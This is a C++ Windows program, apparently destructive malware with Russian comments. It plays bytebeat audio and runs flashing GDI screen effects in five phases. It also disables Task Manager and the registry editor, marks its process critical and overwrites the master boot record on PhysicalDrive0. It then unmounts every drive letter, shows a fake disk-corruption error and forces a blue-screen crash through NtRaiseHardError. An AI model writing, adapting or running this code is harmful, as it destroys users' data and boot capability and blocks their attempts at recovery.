#pragma warning(disable: 4996)
#include <windows.h>
#include <mmsystem.h>
#include <vector>
#include <cmath>
#include <cstdlib>

#pragma comment(lib, "winmm.lib")

#define M_PI 3.14159265358979323846
const int SAMPLE_RATE_1 = 32000;
const int SAMPLE_RATE_2 = 8000;
const int PHASE_DURATION_SEC = 30;
const int TOTAL_SAMPLES_1 = SAMPLE_RATE_1 * PHASE_DURATION_SEC;
const int TOTAL_SAMPLES_2 = SAMPLE_RATE_2 * PHASE_DURATION_SEC;

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef VOID(NTAPI* RSPICdef)(BOOLEAN, PBOOLEAN, BOOLEAN);

int red, green, blue;
COLORREF Hue(int length) {
    if (red != length) { red++; return RGB(red, 0, 0); }
    else if (green != length) { green++; return RGB(length, green, 0); }
    else if (blue != length) { blue++; return RGB(0, length, blue); }
    else { red = 0; green = 0; blue = 0; return RGB(0, 0, 0); }
}

volatile int activePhase = 0;
WCHAR systemInfoText[256] = { 0 };

void RefreshScreenClean() {
    InvalidateRect(NULL, NULL, TRUE);
    UpdateWindow(GetDesktopWindow());
}

DWORD WINAPI PlayBytebeatPhase1(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)SAMPLE_RATE_1, (DWORD)SAMPLE_RATE_1, 1, 8, 0 };
    std::vector<char> soundBuffer(TOTAL_SAMPLES_1);
    const char* melodyStr = "B*918/916-918/91B*918/916-918/91>;2:1;26/;2:1;2>;2:1;26/;2:1;2A*;291;28/;291;2A*;291;28/;291;2B*=-;,=-91=-;,=-B*=-;,=-91=-;,=-E*>6=4>692>6=4>6E*>6=4>692>6=4>6D*<3:1<380<3:1<3D*<3:1<380<3:1<3D(=4<3=481=4<3=4D(=4<3=481=4<3=4B(:18/:16.:18/:1B(:18/:16.:18/:1B&;2:1;26/;2:1;2B&;2:1;26/;2:1;2@&;,9*;,8/;,9*;,@&;,9*;,8/;,9*;,@%=-;,=-91=-;,=-@%=-;,=-91=-;,=->*=-;,=-92=-;,=->*=-;,=-92=-;,=->,8/6-8/428/6-8/>,8/6-8/428/6-8/=-412/4192412141=-412/4192412141;-6341613/634163;-6341613/634163;,8/6-8/528/6-8/;,8/6-8/528/6";
    size_t melodyLen = strlen(melodyStr);
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
        for (DWORD t = 0; t < (DWORD)TOTAL_SAMPLES_1; t++) {
            size_t strIdx = (t >> 12) % melodyLen;
            int charVal = (int)(melodyStr[strIdx]);
            double freqExp = (charVal / 12.0) - 7.0;
            long long a = (long long)(30.0 * t * pow(2.0, freqExp) / 4.0);
            double sum = (a % 255) + (a % 128) + (a % 64) + (a % 32) + (a % 16) + fmod((double)a, 127.8) + fmod((double)a, 64.8) + fmod((double)a, 32.8) + fmod((double)a, 16.8);
            soundBuffer[t] = (char)(sum / 3.0);
        }
        WAVEHDR waveHdr = { soundBuffer.data(), (DWORD)TOTAL_SAMPLES_1, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));
        while (activePhase == 1) Sleep(10); waveOutReset(hWaveOut); waveOutClose(hWaveOut);
    }
    return 0;
}

DWORD WINAPI PlayBytebeatPhase2(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)SAMPLE_RATE_2, (DWORD)SAMPLE_RATE_2, 1, 8, 0 };
    std::vector<char> soundBuffer(TOTAL_SAMPLES_2);
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
        for (DWORD t = 0; t < (DWORD)TOTAL_SAMPLES_2; t++) {
            long long revT = 240000LL - t - 1;
            long long val1 = revT >> 6;
            long long val2 = revT;
            long long shiftAmount = revT >> 16;
            long long val3 = (shiftAmount != 0) ? (revT >> shiftAmount) : 0;
            long long coreCalc = 150 & (val1 | val2 | val3);
            long long extCalc = 7 & (revT >> 11);
            soundBuffer[t] = (char)(coreCalc + extCalc);
        }
        WAVEHDR waveHdr = { soundBuffer.data(), (DWORD)TOTAL_SAMPLES_2, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));
        while (activePhase == 2) Sleep(10); waveOutReset(hWaveOut); waveOutClose(hWaveOut);
    }
    return 0;
}

DWORD WINAPI PlayBytebeatPhase3(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)SAMPLE_RATE_2, (DWORD)SAMPLE_RATE_2, 1, 8, 0 };
    std::vector<char> soundBuffer(TOTAL_SAMPLES_2);
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
        for (DWORD t = 0; t < (DWORD)TOTAL_SAMPLES_2; t++) {
            long long shiftAmount = t >> 16;
            long long val3 = (shiftAmount != 0) ? (t >> shiftAmount) : 0;
            long long coreCalc = 150 * ((t >> 6) | t | val3);
            long long extCalc = 7 & (t >> 11);
            soundBuffer[t] = (char)(coreCalc + extCalc);
        }
        WAVEHDR waveHdr = { soundBuffer.data(), (DWORD)TOTAL_SAMPLES_2, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));
        while (activePhase == 3) Sleep(10); waveOutReset(hWaveOut); waveOutClose(hWaveOut);
    }
    return 0;
}

DWORD WINAPI PlayBytebeatPhase4(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)SAMPLE_RATE_2, (DWORD)SAMPLE_RATE_2, 1, 8, 0 };
    std::vector<char> soundBuffer(TOTAL_SAMPLES_2);
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
        for (DWORD t = 0; t < (DWORD)TOTAL_SAMPLES_2; t++) {
            long long revT = 240000LL - t - 1;
            long long val1 = revT >> 6;
            long long val2 = revT;
            long long shiftAmount = revT >> 16;
            long long val3 = (shiftAmount != 0) ? (revT >> shiftAmount) : 0;
            long long coreCalc = 150 * (val1 | val2 | val3);
            long long extCalc = 7 & (revT >> 11);
            soundBuffer[t] = (char)(coreCalc + extCalc);
        }
        WAVEHDR waveHdr = { soundBuffer.data(), (DWORD)TOTAL_SAMPLES_2, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));
        while (activePhase == 4) Sleep(10); waveOutReset(hWaveOut); waveOutClose(hWaveOut);
    }
    return 0;
}

DWORD WINAPI PlayBytebeatPhase5(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)SAMPLE_RATE_2, (DWORD)SAMPLE_RATE_2, 1, 8, 0 };
    std::vector<char> soundBuffer(TOTAL_SAMPLES_2);
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
        for (DWORD t = 0; t < (DWORD)TOTAL_SAMPLES_2; t++) {
            long long shiftAmount = t >> 16;
            long long val3 = (shiftAmount != 0) ? (t >> shiftAmount) : 0;
            long long coreCalc = 150 & ((t >> 6) | t | val3);
            long long extCalc = 7 & (t >> 11);
            soundBuffer[t] = (char)(coreCalc + extCalc);
        }
        WAVEHDR waveHdr = { soundBuffer.data(), (DWORD)TOTAL_SAMPLES_2, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));
        while (activePhase == 5) Sleep(10); waveOutReset(hWaveOut); waveOutClose(hWaveOut);
    }
    return 0;
}

DWORD WINAPI mountvoled(LPVOID lpvd) {
    LPCWSTR drives[] = { L"A:\\", L"B:\\", L"C:\\", L"D:\\", L"E:\\", L"F:\\", L"G:\\", L"H:\\", L"I:\\", L"J:\\", L"K:\\", L"L:\\", L"M:\\", L"N:\\", L"O:\\", L"P:\\", L"Q:\\", L"R:\\", L"S:\\", L"T:\\", L"U:\\", L"V:\\", L"W:\\", L"X:\\", L"Y:\\", L"Z:\\" };
    for (int i = 0; i < 26; i++) {
        DeleteVolumeMountPointW(drives[i]);
    }
    return 1;
}

void BlockSystemUtility(const char* subKey, const char* valueName, DWORD valueData) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_DWORD, (const BYTE*)&valueData, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow) {
    Sleep(500);

    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
    BlockSystemUtility("Software\\Policies\\Microsoft\\Windows\\MMC", "RestrictToPermittedSnapIns", 1);

    HANDLE hNtdll = LoadLibraryW(L"ntdll.dll");
    if (hNtdll != NULL) {
        BOOLEAN bl;
        RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress((HMODULE)hNtdll, "RtlAdjustPrivilege");
        RSPICdef fSetCritical = (RSPICdef)GetProcAddress((HMODULE)hNtdll, "RtlSetProcessIsCritical");
        if (RtlAdjustPrivilege != NULL && fSetCritical != NULL) {
            RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
            fSetCritical(TRUE, NULL, FALSE);
        }
    }

    unsigned char writeBuffer[512];
    memset((void*)writeBuffer, 0, 512);
    HRSRC hRes = FindResourceA(hInstance, MAKEINTRESOURCEA(101), "BINARY");
    if (hRes != NULL) {
        HGLOBAL hData = LoadResource(hInstance, hRes);
        unsigned char* bootBuffer = (unsigned char*)LockResource(hData);
        DWORD bootSize = SizeofResource(hInstance, hRes);
        if (bootBuffer != NULL && bootSize > 0) {
            DWORD bytesToCopy = (bootSize > 512) ? 512 : bootSize;
            memcpy((void*)writeBuffer, (const void*)bootBuffer, bytesToCopy);
        }
    }
    if (writeBuffer[0] == 0 && writeBuffer[511] == 0) {
        writeBuffer[510] = 0x55; writeBuffer[511] = 0xAA;
    }

    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0; WriteFile(hDisk, (LPCVOID)writeBuffer, 512, &bytesWritten, NULL); CloseHandle(hDisk);
    }

    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HDC deskMem = CreateCompatibleDC(hdc);
    HBITMAP scr = CreateCompatibleBitmap(hdc, sw, sh);
    SelectObject(deskMem, scr);
    LPCWSTR systemCursors[] = { (LPCWSTR)IDC_WAIT, (LPCWSTR)IDC_CROSS, (LPCWSTR)IDC_HELP, (LPCWSTR)IDC_NO, (LPCWSTR)IDC_SIZEALL };
    LPCWSTR txts[] = { L"Ghhfweb.exe", L"Pangey1" };
    // ==========================================
    // 🌪️ ЗАПУСК ФАЗЫ 1 (Прямой агрессивный GDI Бластер)
    // ==========================================
    activePhase = 1;
    HANDLE hSoundThread1 = CreateThread(NULL, 0, PlayBytebeatPhase1, NULL, 0, NULL);
    int n = 4;
    DWORD startTime = GetTickCount();
    int frameCounter = 0;
    while ((GetTickCount() - startTime) < (PHASE_DURATION_SEC * 1000)) {
        frameCounter++;
        BitBlt(deskMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, (rand() % 21) - 10, (rand() % 21) - 10, sw, sh, deskMem, 0, 0, SRCINVERT);
        n = (int)(30.0 * log(frameCounter + 1));
        if (n >= sw / 3) { n = 4; frameCounter = 0; }
        if (frameCounter % 5 == 0) {
            BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
        }
        Sleep(20);
    }
    activePhase = 0;
    if (hSoundThread1 != NULL) { WaitForSingleObject(hSoundThread1, INFINITE); CloseHandle(hSoundThread1); }
    RefreshScreenClean();
    // ==========================================
    // 🌪️ ЗАПУСК ФАЗЫ 2 (Вложенные фрактал-квадраты)
    // ==========================================
    activePhase = 2;
    HANDLE hSoundThread2 = CreateThread(NULL, 0, PlayBytebeatPhase2, NULL, 0, NULL);
    startTime = GetTickCount();
    while ((GetTickCount() - startTime) < (PHASE_DURATION_SEC * 1000)) {
        int outerSize = 100 + (rand() % 200); int x = rand() % (sw - outerSize); int y = rand() % (sh - outerSize);
        HBRUSH outerBrush = CreateSolidBrush(Hue(239)); HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, outerBrush);
        Rectangle(hdc, x, y, x + outerSize, y + outerSize);
        int innerSize = outerSize / 2; int innerX = x + (outerSize - innerSize) / 2; int innerY = y + (outerSize - innerSize) / 2;
        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0)); SelectObject(hdc, blackBrush);
        Rectangle(hdc, innerX, innerY, innerX + innerSize, innerY + innerSize);
        int coreSize = innerSize / 2; int coreX = innerX + (innerSize - coreSize) / 2; int coreY = innerY + (innerSize - coreSize) / 2;
        HBRUSH coreBrush = CreateSolidBrush(Hue(199)); SelectObject(hdc, coreBrush);
        Rectangle(hdc, coreX, coreY, coreX + coreSize, coreY + coreSize);
        SelectObject(hdc, oldBrush); DeleteObject(outerBrush); DeleteObject(blackBrush); DeleteObject(coreBrush);
        Sleep(30);
    }
    activePhase = 0;
    if (hSoundThread2 != NULL) { WaitForSingleObject(hSoundThread2, INFINITE); CloseHandle(hSoundThread2); }
    RefreshScreenClean();
    Sleep(1000);
    // ==========================================
    // 🌪️ ЗАПУСК ФАЗЫ 3 (Только имя OS и Редакция отдельно)
    // ==========================================
    activePhase = 3;
    HANDLE hSoundThread3 = CreateThread(NULL, 0, PlayBytebeatPhase3, NULL, 0, NULL);
    HKEY hKey;
    WCHAR prodName[128] = { 0 };
    WCHAR editId[128] = { 0 };
    DWORD dwSize = sizeof(prodName);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"ProductName", NULL, NULL, (LPBYTE)prodName, &dwSize);
        dwSize = sizeof(editId);
        RegQueryValueExW(hKey, L"EditionID", NULL, NULL, (LPBYTE)editId, &dwSize);
        RegCloseKey(hKey);
    }
    // Полностью вычищено: Никаких цифр и юзеров, только "Windows 7 Ultimate"
    wsprintfW(systemInfoText, L"%s %s", prodName, editId);
    int textLen = lstrlenW(systemInfoText);
    startTime = GetTickCount();
    while ((GetTickCount() - startTime) < (PHASE_DURATION_SEC * 1000)) {
        int tx = rand() % (sw - 300); int ty = rand() % (sh - 30);
        SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
        HFONT font = CreateFontW(rand() % 25 + 15, 0, 0, 0, FW_HEAVY, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, L"Impact");
        HFONT oldFont = (HFONT)SelectObject(hdc, font);
        TextOutW(hdc, tx, ty, systemInfoText, textLen);
        SelectObject(hdc, oldFont); DeleteObject(font);
        if (rand() % 10 == 0) BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, sw, sh, hdc, 0, 0, SRCCOPY);
        Sleep(15);
    }
    activePhase = 0;
    if (hSoundThread3 != NULL) { WaitForSingleObject(hSoundThread3, INFINITE); CloseHandle(hSoundThread3); }
    RefreshScreenClean();
    Sleep(1000);
    // ==========================================
    // 🌪️ ЗАПУСК ФАЗЫ 4 (Уползание вниз + Хвост из крестиков)
    // ==========================================
    activePhase = 4;
    HANDLE hSoundThread4 = CreateThread(NULL, 0, PlayBytebeatPhase4, NULL, 0, NULL);
    startTime = GetTickCount();
    while ((GetTickCount() - startTime) < (PHASE_DURATION_SEC * 1000)) {
        BitBlt(hdc, 0, 8, sw, sh, hdc, 0, 0, SRCCOPY);
        POINT mPos; GetCursorPos(&mPos);
        DrawIconEx(hdc, mPos.x - 16, mPos.y - 16, LoadIconW(NULL, IDI_HAND), 32, 32, 0, NULL, DI_NORMAL);
        Sleep(15);
    }
    activePhase = 0;
    if (hSoundThread4 != NULL) { WaitForSingleObject(hSoundThread4, INFINITE); CloseHandle(hSoundThread4); }
    RefreshScreenClean();
    // ==========================================
    // 🌪️ ЗАПУСК ФАЗЫ 5 (DVD + Спирали)
    // ==========================================
    activePhase = 5;
    HANDLE hSoundThread5 = CreateThread(NULL, 0, PlayBytebeatPhase5, NULL, 0, NULL);
    int dvdX = sw / 2, dvdY = sh / 2; int dvdDX = 15, dvdDY = 11;
    float spiralAngle = 0.0f; HICON hHandIcon = LoadIconW(NULL, IDI_HAND);
    startTime = GetTickCount();
    while ((GetTickCount() - startTime) < (PHASE_DURATION_SEC * 1000)) {
        dvdX += dvdDX; dvdY += dvdDY;
        if (dvdX <= 0 || dvdX >= sw - 32) dvdDX = -dvdDX;
        if (dvdY <= 0 || dvdY >= sh - 32) dvdDY = -dvdDY;
        DrawIconEx(hdc, dvdX, dvdY, hHandIcon, 48, 48, 0, NULL, DI_NORMAL);
        spiralAngle += 0.1f;
        float currentRadius = 150.0f - fmod(spiralAngle * 2.0f, 150.0f);
        if (currentRadius > 5.0f) {
            int sx = dvdX + 24 + (int)(currentRadius * sin(spiralAngle));
            int sy = dvdY + 24 + (int)(currentRadius * cos(spiralAngle));
            HPEN spiralPen = CreatePen(PS_SOLID, 3, Hue(255)); HPEN oldPen = (HPEN)SelectObject(hdc, spiralPen);
            MoveToEx(hdc, dvdX + 24, dvdY + 24, NULL); LineTo(hdc, sx, sy);
            SelectObject(hdc, oldPen); DeleteObject(spiralPen);
        }
        Sleep(1);
    }
    activePhase = 0;
    if (hSoundThread5 != NULL) { WaitForSingleObject(hSoundThread5, INFINITE); CloseHandle(hSoundThread5); }
    // ==========================================
    // 💥 ЭПИЧЕСКИЙ ФИНАЛ
    // ==========================================
    CreateThread(NULL, 0, mountvoled, NULL, 0, NULL);
    Sleep(200);
    SetCursorPos(sw / 2, sh / 2);
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    Sleep(150);
    SetCursorPos(sw / 2 + 30, sh / 2 + 70);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    Sleep(15000);
    MessageBoxW(NULL, L"The file system structure on the disk is corrupt and unusable. Please run the chkdsk utility.", L"Fatal File System Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
    DeleteDC(deskMem); DeleteObject(scr); ReleaseDC(NULL, hdc);
    if (hNtdll != NULL) {
        ULONG_PTR uResponse; ULONG uRespOut;
        RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress((HMODULE)hNtdll, "RtlAdjustPrivilege");
        NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress((HMODULE)hNtdll, "NtRaiseHardError");
        if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            NtRaiseHardError(0x00000032, 0, 0, &uResponse, 6, &uRespOut);
        }
    }
    Sleep(-1);
    return 0;
}
